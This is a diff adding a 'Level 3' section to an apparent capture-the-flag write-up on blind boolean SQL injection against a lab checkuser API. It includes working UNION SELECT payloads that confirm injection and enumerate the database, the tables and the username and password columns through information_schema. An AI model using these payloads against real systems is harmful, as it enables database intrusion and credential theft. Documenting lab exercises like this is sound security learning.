@@ -115,9 +115,65 @@ Entered payload
 
 Login was bypassed and flag was captured 
 
-
+---
 
 ### Level 3
+
+#### Objective 
+
+**Extract credentials using only true/false responses**
+
+#### Enumerate Page and Confirm Injection 
+
+Presented with checkuser API at https://website.thm/checkuser?username=admin returning {"taken":true}
+
+![Home-Page](Images/sqli3-home.jpeg)
+
+Attempted to confirm whether URL parameter username was injectable or not 
+
+```SQL
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
+```
+Respone returned {"taken":true} confirming parameter is injectable 
+
+
+
+#### Enumerate Database 
+
+Attempted to get database, character by character 
+
+![db-1](Images/sqli3-db1.jpeg)
+![db-2](Images/sqli3-db2.jpeg)
+
+Confirmed database name `sqli_three` via {"taken":true} page response 
+
+![db-3](Images/sqli3-db3.jpeg)
+
+#### Enumerate Tables and Columns
+
+Queried information_schema.tables within 'sqli_three' database  to enumerate available tables (LIKE)
+
+```SQL
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like '%';--
+```
+
+Narrowed result down to table 'users' 
+![Table-Name](Images/sqli3-usrtable.jpeg)
+
+Extracted available columns from users through the same enumeration process
+
+```SQL
+admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like '%';--
+```
+
+Confirmed the column `username` exists 
+
+![user-column](Images/sqli3-usercolumn.jpeg)
+
+Confirmed column `password` exists 
+
+![pass-column](Images/sqli3-passcolumn.jpeg)
+
 
 
 
